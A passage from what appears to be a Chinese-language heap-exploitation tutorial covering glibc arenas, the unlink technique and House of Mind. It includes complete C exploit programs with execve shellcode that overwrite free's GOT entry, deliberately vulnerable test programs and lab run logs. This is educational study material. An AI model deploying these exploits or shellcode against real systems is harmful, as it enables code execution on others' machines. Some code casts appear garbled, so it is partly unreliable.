现在当线程3调用<code>malloc</code>（第二次）时，<code>malloc</code>将尝试使用最后访问的竞技场（主竞技场）。如果主竞技场是免费的，则其使用的其他<code>thread3</code>将被阻止，直到主竞技场被释放。<code>因此现在主要的竞技场在主线程和线程3之间共享。</code></p><p><strong>利用程序：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* Program to exploit 'test' using unlink technique. */</span>  </span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;      </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> FUNCTION_POINTER ( 0x0804978c )         <span class="comment">//Address of GOT entry for free function obtained using "objdump -R vuln".  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> CODE_ADDRESS ( 0x0804a008 + 0x10 )      <span class="comment">//Address of variable 'first' in vuln executable.      </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> VULNERABLE <span class="meta-string">"./test"</span>  </span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> DUMMY 0xdefaced  </span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1     </span></span><br><span class="line"> <span class="keyword">char</span> shellcode[] =  </span><br><span class="line">        <span class="comment">/* Jump instruction to jump past 10 bytes. ppssssffff - Of which ffff would be overwritten by unlink function </span></span><br><span class="line"><span class="comment">        (by statement BK-&gt;fd = FD). Hence if no jump exists shell code would get corrupted by unlink function.  </span></span><br><span class="line"><span class="comment">        Therefore store the actual shellcode 12 bytes past the beginning of buffer 'first'*/</span>  </span><br><span class="line">        <span class="string">"\xeb\x0assppppffff"</span>               <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>;    </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">void</span> )</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">        <span class="keyword">char</span> * p;  </span><br><span class="line">        <span class="keyword">char</span> argv1[ <span class="number">680</span> + <span class="number">1</span> ];  </span><br><span class="line">        <span class="keyword">char</span> * argv[] = &#123; VULNERABLE, argv1, <span class="literal">NULL</span> &#125;;  </span><br><span class="line">        p = argv1;  </span><br><span class="line">        <span class="comment">/* the fd field of the first chunk */</span>  </span><br><span class="line">        *( (<span class="keyword">void</span>)p ) = (<span class="keyword">void</span>)( DUMMY );  </span><br><span class="line">        p += <span class="number">4</span>;  </span><br><span class="line">        <span class="comment">/* the bk field of the first chunk */</span>  </span><br><span class="line">        *( (<span class="keyword">void</span>)p ) = (<span class="keyword">void</span>)( DUMMY );  </span><br><span class="line">        p += <span class="number">4</span>;  </span><br><span class="line">        <span class="comment">/* the fd_nextsize field of the first chunk */</span>  </span><br><span class="line">        *( (<span class="keyword">void</span>)p ) = (<span class="keyword">void</span>)( DUMMY );  </span><br><span class="line">        p += <span class="number">4</span>;  </span><br><span class="line">       <span class="comment">/* the bk_nextsize field of the first chunk */</span>  </span><br><span class="line">        *( (<span class="keyword">void</span>)p ) = (<span class="keyword">void</span>)( DUMMY );  </span><br><span class="line">       p += <span class="number">4</span>;  </span><br><span class="line">        <span class="comment">/* Copy the shellcode */</span>  </span><br><span class="line">        <span class="built_in">memcpy</span>( p, shellcode, <span class="built_in">strlen</span>(shellcode) );  </span><br><span class="line">        p += <span class="built_in">strlen</span>( shellcode );  </span><br><span class="line">       <span class="comment">/* Padding- 16 bytes for prev_size,size,fd and bk of second chunk. 16 bytes for fd,bk,fd_nextsize,bk_nextsize  </span></span><br><span class="line"><span class="comment">        of first chunk */</span>  </span><br><span class="line">        <span class="built_in">memset</span>( p, <span class="string">'B'</span>, (<span class="number">680</span> - <span class="number">4</span>*<span class="number">4</span>) - (<span class="number">4</span>*<span class="number">4</span> + <span class="built_in">strlen</span>(shellcode)) );  </span><br><span class="line">        p += ( <span class="number">680</span> - <span class="number">4</span>*<span class="number">4</span> ) - ( <span class="number">4</span>*<span class="number">4</span> + <span class="built_in">strlen</span>(shellcode) );  </span><br><span class="line">        <span class="comment">/* the prev_size field of the second chunk. Just make sure its an even number ie) its prev_inuse bit is unset */</span>  </span><br><span class="line">        *( (<span class="keyword">size_t</span>)p ) = *<span class="keyword">size_t</span>)( DUMMY &amp; ~PREV_INUSE );  </span><br><span class="line">        p += <span class="number">4</span>;  </span><br><span class="line">        <span class="comment">/* the size field of the second chunk. By setting size to -4, we trick glibc malloc to unlink second chunk.*/</span>  </span><br><span class="line">        *( (<span class="keyword">size_t</span>)p ) = (<span class="keyword">size_t</span>)( <span class="number">-4</span> );  </span><br><span class="line">        p += <span class="number">4</span>;  </span><br><span class="line">        <span class="comment">/* the fd field of the second chunk. It should point to free - 12. -12 is required since unlink function </span></span><br><span class="line"><span class="comment">        would do + 12 (FD-&gt;bk). This helps to overwrite the GOT entry of free with the address we have overwritten in  </span></span><br><span class="line"><span class="comment">       second chunk's bk field (see below) */</span>  </span><br><span class="line">        *( (<span class="keyword">void</span>)p ) = (<span class="keyword">void</span>)( FUNCTION_POINTER - <span class="number">12</span> );  </span><br><span class="line">        p += <span class="number">4</span>;  </span><br><span class="line">        <span class="comment">/* the bk field of the second chunk. It should point to shell code address.*/</span>  </span><br><span class="line">        *( (<span class="keyword">void</span>)p ) = (<span class="keyword">void</span>)( CODE_ADDRESS );  </span><br><span class="line">        p += <span class="number">4</span>;  </span><br><span class="line">        <span class="comment">/* the terminating NUL character */</span>  </span><br><span class="line">        *p = '';  </span><br><span class="line">        <span class="comment">/* the execution of the vulnerable program */</span>  </span><br><span class="line">        execve( argv[<span class="number">0</span>], argv, <span class="literal">NULL</span> );  </span><br><span class="line">        <span class="keyword">return</span>( <span class="number">-1</span> );  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行上述程序会派生新的 <code>shell</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">szt@ubuntu:~/linux exploit/test9$ $ gcc -g -z norelro -z execstack -o test test.c -Wl,--rpath=/home/szt/glibc/glibc-inst2<span class="number">.20</span>/lib -Wl,--dynamic-linker=/home/szt/glibc/glibc-inst2<span class="number">.20</span>/lib/ld-linux.so.  </span><br><span class="line">szt@ubuntu:~/linux exploit/test9$ gcc -g -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c  </span><br><span class="line">szt@ubuntu:~/linux exploit/test9$ ./<span class="built_in">exp</span>   </span><br><span class="line">szt@ubuntu:~/linux exploit/test9$ ls  </span><br><span class="line"><span class="built_in">exp</span>.c  <span class="built_in">exp</span>.c~  test  test.c</span><br></pre></td></tr></table></figure><p>但是运行并不成功，后来查询资料。发现是已经加强了防护。使得这种更难攻击成功。</p><hr><h2 id="使用-Malloc-Maleficarum-的堆溢出"><a href="#使用-Malloc-Maleficarum-的堆溢出" class="headerlink" title="使用 Malloc Maleficarum 的堆溢出"></a>使用 Malloc Maleficarum 的堆溢出</h2><p>虚拟机：Ubuntu 12.04（x86）</p><p>glibc malloc 变得更可靠了。之后，类似 unlink 的技巧已经废弃，攻击者没有线索。但是在 2005 年末，Phantasmal Phatasmagoria 带来了下面这些技巧，用于成功利用堆溢出。</p><blockquote><p>• House of Prime</p><p>• House of Mind</p><p>• House of Force</p><p>• House of Lore</p><p>• House of Spirit</p></blockquote><p><strong>House of Mind</strong></p><p>这个技巧中，攻击者欺骗 <code>glibc malloc</code> 来使用由他伪造的 <code>arena</code>。伪造的 <code>arena</code> 以这种形式构造，<code>unsorted bin</code> 的 <code>fd</code>包含<code>free的 GOT 条目地址 -12</code>。因此现在当漏洞程序释放某个块的时候，free的 GOT 条目被覆盖为 <code>shellcode</code> 的地址。在成功覆盖 GOT 之后，当漏洞程序调用<code>free</code>，<code>shellcode</code> 就会执行。</p><p>这个需要先决条件：</p><p>• 在块的地址之前，需要一系列 <code>malloc 调用</code>– 当对齐到内存区域中<code>HEAP_MAX_SIZE</code>结果的倍数的时候，内存区域由攻击者控制。这是伪造的<code>heap_info</code>结构所在的内存区域。<code>伪造的heap_info</code>的 <code>arena 指针ar_ptr</code>会指向<code>伪造的 arena</code>。因此伪造的 <code>arena</code> 和<code>伪造的heap_info</code>的内存区域都能由攻击者控制。</p><p>• 一个块，它的大小字段（以及它的 arena 指针 – 预备条件 1）由攻击者控制，应该已释放。</p><p>• 上述空闲块的下一个块应该不是 <code>top</code> 块。</p><p><strong>漏洞程序：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* test.c </span></span><br><span class="line"><span class="comment"> House of Mind vulnerable program </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;      </span></span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span> </span>&#123;  </span><br><span class="line">     <span class="keyword">char</span> *ptr = <span class="built_in">malloc</span>(<span class="number">1024</span>); <span class="comment">/* First allocated chunk */</span>  </span><br><span class="line">     <span class="keyword">char</span> *ptr2; <span class="comment">/* Second chunk/Last but one chunk */</span>  </span><br><span class="line">     <span class="keyword">char</span> *ptr3; <span class="comment">/* Last chunk */</span>  </span><br><span class="line">     <span class="keyword">int</span> heap = (**<span class="keyword">int</span>**)ptr &amp; <span class="number">0xFFF00000</span>;  </span><br><span class="line">     <span class="keyword">_Bool</span> found = <span class="number">0</span>;  </span><br><span class="line">     <span class="keyword">int</span> i = <span class="number">2</span>;     </span><br><span class="line">     <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt; <span class="number">1024</span>; i++) &#123;  </span><br><span class="line">   <span class="comment">/* Prereq 1: Series of malloc calls until a chunk's address - when aligned to HEAP_MAX_SIZE results in 0x08100000 */</span>  </span><br><span class="line">   <span class="comment">/* 0x08100000 is the place where fake heap_info structure is found. */</span>  </span><br><span class="line">   [<span class="number">1</span>]**<span class="keyword">if</span>** (!found &amp;&amp; (((**<span class="keyword">int</span>**)(ptr2 = <span class="built_in">malloc</span>(<span class="number">1024</span>)) &amp; <span class="number">0xFFF00000</span>) == \  </span><br><span class="line">      (heap + <span class="number">0x100000</span>))) &#123;  </span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"good heap allignment found on malloc() %i (%p)\n"</span>, i, ptr2);  </span><br><span class="line">       found = <span class="number">1</span>;  </span><br><span class="line">       <span class="keyword">break</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> &#125;  </span><br><span class="line"> [<span class="number">2</span>]ptr3 = <span class="built_in">malloc</span>(<span class="number">1024</span>); <span class="comment">/* Last chunk. Prereq 3: Next chunk to ptr2 != av-&gt;top */</span>  </span><br><span class="line"> <span class="comment">/* User Input. */</span>  </span><br><span class="line"> [<span class="number">3</span>]fread (ptr, <span class="number">1024</span> * <span class="number">1024</span>, <span class="number">1</span>, <span class="built_in">stdin</span>);     </span><br><span class="line"> [<span class="number">4</span>]<span class="built_in">free</span>(ptr2); <span class="comment">/* Prereq 2: Freeing a chunk whose size and its arena pointer is controlled by the attacker. */</span>  </span><br><span class="line"> [<span class="number">5</span>]<span class="built_in">free</span>(ptr3); <span class="comment">/* Shell code execution. */</span>  </span><br><span class="line"> <span class="keyword">return</span>(<span class="number">0</span>); <span class="comment">/* Bye */</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞程序的<code>行[3]</code>是堆溢出发生的地方。用户输入储存在块 1 的<code>mem指针</code>处，大小共计 <code>1MB</code>。所以为了成功利用堆溢出，攻击者提供了下面的用户输入。</p><p><strong>利用程序：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* exp.c </span></span><br><span class="line"><span class="comment"> Program to generate attacker data. </span></span><br><span class="line"><span class="comment"> Command: </span></span><br><span class="line"><span class="comment">      #./exp &gt; file </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;    </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> BIN1 0xb7fd8430    </span></span><br><span class="line"> <span class="keyword">char</span> scode[] =  </span><br><span class="line"><span class="comment">/* Shellcode to execute linux command "id". Size - 72 bytes. */</span>  </span><br><span class="line"><span class="string">"\x31\xc9\x83\xe9\xf4\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e"</span>  </span><br><span class="line"><span class="string">"\xc9\x6a\x42\x83\xeb\xfc\xe2\xf4\x34\xc2\x32\xdb\x0c\xaf\x02\x6f"</span>  </span><br><span class="line"><span class="string">"\x3d\x40\x8d\x2a\x71\xba\x02\x42\x36\xe6\x08\x2b\x30\x40\x89\x10"</span>  </span><br><span class="line"><span class="string">"\xb6\xc5\x6a\x42\x5e\xe6\x1f\x31\x2c\xe6\x08\x2b\x30\xe6\x03\x26"</span>  </span><br><span class="line"><span class="string">"\x5e\x9e\x39\xcb\xbf\x04\xea\x42"</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">char</span> ret_str[<span class="number">4</span>] = <span class="string">"\x00\x00\x00\x00"</span>;     </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">convert_endianess</span><span class="params">(<span class="keyword">int</span> arg)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;  </span><br><span class="line">        ret_str[<span class="number">3</span>] = (arg &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>;  </span><br><span class="line">        ret_str[<span class="number">2</span>] = (arg &amp; <span class="number">0x00FF0000</span>) &gt;&gt; <span class="number">16</span>;  </span><br><span class="line">        ret_str[<span class="number">1</span>] = (arg &amp; <span class="number">0x0000FF00</span>) &gt;&gt; <span class="number">8</span>;  </span><br><span class="line">        ret_str[<span class="number">0</span>] = (arg &amp; <span class="number">0x000000FF</span>) &gt;&gt; <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;  </span><br><span class="line">  </span><br><span class="line">        fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fd */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bk */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fd_nextsize */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bk_nextsize */</span>  </span><br><span class="line">        <span class="comment">/* Fake Arena. */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* mutex */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x01\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* flag */</span>  </span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)  </span><br><span class="line">                fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fastbinsY */</span>  </span><br><span class="line">        fwrite(<span class="string">"\xb0\x0e\x10\x08"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* top */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* last_remainder */</span>  </span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">127</span>;i++) &#123;  </span><br><span class="line">                convert_endianess(BIN1+(i*<span class="number">8</span>));  </span><br><span class="line">                <span class="keyword">if</span>(i == <span class="number">119</span>) &#123;  </span><br><span class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* preserve prev_size */</span>  </span><br><span class="line">                        fwrite(<span class="string">"\x09\x04\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* preserve size */</span>  </span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span>(i==<span class="number">0</span>) &#123;  </span><br><span class="line">                        fwrite(<span class="string">"\xe8\x98\x04\x08"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bins[i][0] = (GOT(free) - 12) */</span>  </span><br><span class="line">                        fwrite(ret_str, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bins[i][1] */</span>  </span><br><span class="line">                &#125;  </span><br><span class="line">               <span class="keyword">else</span> &#123;  </span><br><span class="line">                        fwrite(ret_str, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bins[i][0] */</span>  </span><br><span class="line">                       fwrite(ret_str, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bins[i][1] */</span>  </span><br><span class="line">                &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;  </span><br><span class="line">                fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* binmap[i] */</span>  </span><br><span class="line">        &#125;  </span><br><span class="line">        fwrite(<span class="string">"\x00\x84\xfd\xb7"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* next */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* next_free */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x00\x60\x0c\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* system_mem */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x00\x60\x0c\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* max_system_mem */</span>  </span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">234</span>;i++) &#123;  </span><br><span class="line">                fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span>  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">722</span>;i++) &#123;  </span><br><span class="line">                <span class="keyword">if</span>(i==<span class="number">721</span>) &#123;  </span><br><span class="line">                       <span class="comment">/* Chunk 724 contains the shellcode. */</span>  </span><br><span class="line">                        fwrite(<span class="string">"\xeb\x18\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* prev_size  - Jmp 24 bytes */</span>  </span><br><span class="line">                        fwrite(<span class="string">"\x0d\x04\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* size */</span>  </span><br><span class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fd */</span>  </span><br><span class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bk */</span>  </span><br><span class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fd_nextsize */</span>                           fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bk_nextsize */</span>                           fwrite(<span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span> \  </span><br><span class="line">                       <span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="built_in">stdout</span>);  <span class="comment">/* NOPS */</span>  </span><br><span class="line">                        fwrite(scode, **<span class="keyword">sizeof</span>**(scode)<span class="number">-1</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* SHELLCODE */</span>                           <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">230</span>;j++)  </span><br><span class="line">                                fwrite(<span class="string">"\x42\x42\x42\x42"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span>                          <span class="keyword">continue</span>;  </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* prev_size */</span>  </span><br><span class="line">                        fwrite(<span class="string">"\x09\x04\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* size */</span>  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">if</span>(i==<span class="number">720</span>) &#123;  </span><br><span class="line">                       <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">90</span>;j++)  </span><br><span class="line">                                fwrite(<span class="string">"\x42\x42\x42\x42"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span>                           fwrite(<span class="string">"\x18\xa0\x04\x08"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* Arena Pointer */</span>                          <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">165</span>;j++)  </span><br><span class="line">                                fwrite(<span class="string">"\x42\x42\x42\x42"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span>  </span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;  </span><br><span class="line">                        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">256</span>;j++)  </span><br><span class="line">                                fwrite(<span class="string">"\x42\x42\x42\x42"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span> </span><br><span class="line">                &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在攻击者生成数据作为用户输入之后，<code>glibc malloc</code> 执行下列事情，当漏洞程序的行[4]执行时：</p><p>   <strong>Step 1</strong>：正在释放的<code>堆的 arena</code> 由访问<code>arena_for_chunk</code>获取。</p><p>   <strong>Step 2</strong>：使用 <code>arena 指针</code>和<code>块地址</code>作为参数调用<code>_int_free</code>。我们这里，<code>arena 指针</code>指向了<code>伪造的 arena。因此伪造的 arena</code> 和<code>块地址</code>作为参数传递给了<code>_int_free</code>。</p><p>   <strong>Step 3</strong>：如果块不是 <code>mmap</code>分配的，要获取锁。我们这里块不是<code>mmap</code>配的，<code>伪造的 arena</code>的互斥锁获取成功。</p><p>   <strong>Step 4</strong>：合并： 查看上一个块是否空闲，如果空闲则合并。我们这里上一个块已分配，所以不能向后合并。查看下一个块是否空闲，如果空闲则合并。我们这里下一个块已分配，所以不能合并。</p><p>   <strong>Step 5</strong>：将当前空闲块放进 <code>unsorted bin</code>中。</p><p>使用攻击者生成的数据文件，作为用户输入执行漏洞程序会执行<code>shellcode</code>，像这样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">szt@ubuntu:~/linux exploit/test10$ $gcc -g -z norelro -z execstack -o test test.c -Wl,--rpath=/home/szt/glibc/glibc-inst2<span class="number">.20</span>/lib -Wl,--dynamic-linker=/home/szt/glibc/glibc-inst2<span class="number">.20</span>/lib/ld-linux.so<span class="number">.2</span>  </span><br><span class="line">szt@ubuntu:~/linux exploit/test10$ gcc -g -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c  </span><br><span class="line">szt@ubuntu:~/linux exploit/test10$ ./<span class="built_in">exp</span> &gt; file  </span><br><span class="line">szt@ubuntu:~/linux exploit/test10$ ./test &lt; file  </span><br><span class="line">ptr found at <span class="number">0x8048380</span>  </span><br><span class="line">good heap allignment found on <span class="built_in">malloc</span>() <span 